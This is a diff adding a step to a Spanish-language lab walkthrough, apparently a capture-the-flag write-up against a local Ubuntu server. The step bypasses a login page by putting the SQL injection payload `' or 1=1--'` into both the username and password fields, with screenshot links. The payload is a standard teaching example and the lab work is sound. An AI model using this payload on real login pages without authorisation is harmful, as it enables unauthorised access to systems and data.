@@ -40,5 +40,14 @@ O.S: Linux (**Ubuntu**)
 
 URL del servidor: `http://192.168.25.131`
 
+![5](https://user-images.githubusercontent.com/75953873/182724778-d685a545-04c9-4e41-8a49-3058067bc121.png)
 
+- *Paso 4:* Bypassear página con inyección SQL manual. 
 
+Username: `' or 1=1--'`
+
+Password: `' or 1=1--'`
+
+![6](https://user-images.githubusercontent.com/75953873/182725260-0ebeb8c5-c0af-465d-b520-69816fb8b37a.png)
+
+![7](https://user-images.githubusercontent.com/75953873/182725313-445bffd4-699b-404c-9304-80a514377bfa.png)
